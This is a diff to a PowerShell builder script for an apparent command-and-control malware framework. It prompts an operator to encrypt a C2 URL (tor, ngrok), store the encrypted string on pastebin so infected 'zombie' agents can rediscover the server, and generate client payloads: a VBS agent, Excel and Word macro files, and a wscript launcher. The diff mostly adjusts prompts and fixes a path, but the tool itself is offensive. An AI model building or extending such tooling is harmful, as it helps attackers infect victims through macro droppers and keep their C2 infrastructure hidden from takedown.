@@ -84,7 +84,9 @@ If (Test-Path  $ScriptDir\Package){ } else { New-Item -Path $ScriptDir -Name "Pa
 Import-Module $ScriptDir\Build\xencrypt.ps1
 $ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
 
-$choice0 = Read-Host -Prompt 'Do you need to setup persistence for your C2 URL ? (y/n)'
+#################   SERVER PERSISTENCE SETUP #########################################
+Write-Host "Do you need to setup persistence for your C2 URL ? " -ForegroundColor Yellow;
+$choice0 = Read-Host -Prompt '(y/n)'
 if ($choice0 -eq "y") {
 function PastebinStoredC2Value ($MyC2Url) {
 	$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
@@ -110,21 +112,23 @@ You can change it at your convenience by using an encrypted file containing the 
 Each time the zombie want to contact C2, it will check for actual C2 URL by obtaining and decrypting the C2 URL stored in that file.
 The next steps will help you to setup this C2 persistence process.
 "
-
-$ngrokUrl = Read-Host -Prompt 'Type your C2 URL (it can be tor,ngrok,...) example (follow exactly this typo) No "/" at the end --> http://127.0.0.1'
+Write-Host "PHASE 1 - ENCRYPT C2 URL --------------------------------" -ForegroundColor Blue;
+Write-Host "Type your C2 URL (it can be tor,ngrok,...) Follow exactly this typo -> http://127.0.0.1"
+$ngrokUrl = Read-Host -Prompt '(No "/" at the end )'
 PastebinStoredC2Value $ngrokUrl
 
-Write-Host " 1-  'PrepareC2.txt' file have been generated it contain all the encrypted value you need to terminate this C2 persistence setup process
+Write-Host "PHASE 2 - ADD DECRYPTION KEY TO CONFIG FILE -------------" -ForegroundColor Blue;
+Write-Host " 'PrepareC2.txt' file have been generated it contain all the encrypted value you need to terminate this C2 persistence setup process
 Now you must edit and save your 'CONFIG.ini' before CONTINUE.
 You have to change the key value 'keytoreadgetc2' of 'CONFIG.INI' by the one generated in 'PrepareC2.txt'.
 By doing so, your agent will be able to decrypt C2 URL encrypted string
-
 "
-#$ooo = Read-Host -Prompt ' Press ENTER to OPEN FILES !'
-#start $ScriptDir\prepareC2.txt
-#start $ScriptDir\config.ini
-#$ooo = Read-Host -Prompt ' Press ENTER to continue !'
-Write-Host "2-  Once you have finished to update 'CONFIG.INI'  
+Start-Sleep -Seconds 5 
+start $ScriptDir\prepareC2.txt
+start $ScriptDir\config.ini
+$ooo = Read-Host -Prompt ' Press ENTER to SEE NEXT INSTRUCTION !'
+Write-Host "PHASE 3 - HOST FILE CONTAINING C2 URL ENCRYPTED STRING -----" -ForegroundColor Blue;
+Write-Host "Once you have finished to update 'CONFIG.INI'  
 You need to host or store over Internet a file containing only the C2 URL encrypted string provided in your 'prepareC2.txt' file (you can use pastebin service-like).
 	>>> Example: Go to pastebin.com and crete a new paste containing only C2 URL encrypted string, something like: TUtAdo8fKzUeKEdcO3LWyJW/LWsZfayDHHeLHqerEKK
 And Edit 'getC2' key value in your 'CONFIG.ini' to point to the URL of the file you will host or store over Internet, save 'CONFIG.INI' and close it.
@@ -132,13 +136,14 @@ And Edit 'getC2' key value in your 'CONFIG.ini' to point to the URL of the file 
 
 "
 $ooo = Read-Host -Prompt 'Press ENTER to OPEN FILES !'
-start $ScriptDir\prepareC2.txt
-start $ScriptDir\config.ini
-$ooo = Read-Host -Prompt ' Press ENTER to continue !'
+#start $ScriptDir\prepareC2.txt
+#start $ScriptDir\config.ini
+#$ooo = Read-Host -Prompt ' Press ENTER to continue !'
 }
 
 ################# CLIENT GENERATION #################################################
-$choice1 = Read-Host -Prompt 'Do you want to generate client files ? (y/n)'
+Write-Host "Do you want to generate client files ? " -ForegroundColor Yellow;
+$choice1 = Read-Host -Prompt '(y/n)'
 if ($choice1 -eq "y") {
 If (Test-Path  $ScriptDir\Package\Client){ Remove-Item -path $ScriptDir\Package\Client }
 New-Item -Path $ScriptDir\Package -Name "Client" -ItemType "directory"
@@ -489,7 +494,7 @@ Set objShell = Nothing
 	echo $vbsscript > $ScriptDir\Package\vbs\agent.vbs
 	echo $macrovbs > $ScriptDir\Package\xls\macroexcel.vba
 	echo $macrovbs_w > $ScriptDir\Package\xls\macroword.vba	
-	echo $macrovbs > $ScriptDir\Package\c2c\macro.txt	
+	echo $macrovbs > $ScriptDir\Package\c2c\macro.vbs	
 	}
 Out-VBSMacro
 set-content $ScriptDir\Package\vbs\agent_vbs.bat -Value "wscript.exe /NoLogo /B .\agent.vbs"
@@ -785,12 +790,13 @@ Write-Host "CONTENT GENERATED IN FOLDER c2c MUST BE COPY&PASTE IN THE LINKFOLDER
 $ooo = Read-Host -Prompt 'OK'
 }
 
-#################  SERVER C2 ENCRYPTION #############################################
+#################  C2 SERVER ENCRYPTION #############################################
 $ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
 Get-Content "$ScriptDir\config.ini" | ForEach-Object -Begin {$settings=@{}} -Process {$store = [regex]::split($_,'='); if(($store[0].CompareTo("") -ne 0) -and ($store[0].StartsWith("[") -ne $True) -and ($store[0].StartsWith("#") -ne $True)) {$settings.Add($store[0], $store[1])}}
 $linkfolder = $settings.Get_Item("linkfolder")
 
-$choice2 = Read-Host -Prompt 'Do you want to generate C2 Server files ? (y/n)'
+Write-Host "Do you want to generate C2 Server files ? " -ForegroundColor Yellow;
+$choice2 = Read-Host -Prompt '(y/n)'
 if ($choice2 -eq "y") {
 
 If (Test-Path  $ScriptDir\Package\Server){ Remove-Item -path $ScriptDir\Package\Server }
@@ -807,7 +813,7 @@ copy $ScriptDir\www\ui\* $ScriptDir\Package\Server\ui
 # Link Folder
 copy $ScriptDir\www\link\*.html $ScriptDir\Package\Server\$linkfolder
 copy $ScriptDir\www\link\*.php $ScriptDir\Package\Server\$linkfolder
-copy $ScriptDir\www\link\*.png $ScriptDir\Package\C2Server\$linkfolder
+copy $ScriptDir\www\link\*.png $ScriptDir\Package\Server\$linkfolder
 copy $ScriptDir\www\link\*.xml $ScriptDir\Package\Server\$linkfolder
 copy $ScriptDir\www\link\*.psm1 $ScriptDir\Package\Server\$linkfolder
 copy $ScriptDir\www\link\*.psm1 $ScriptDir\Package\Server\$linkfolder
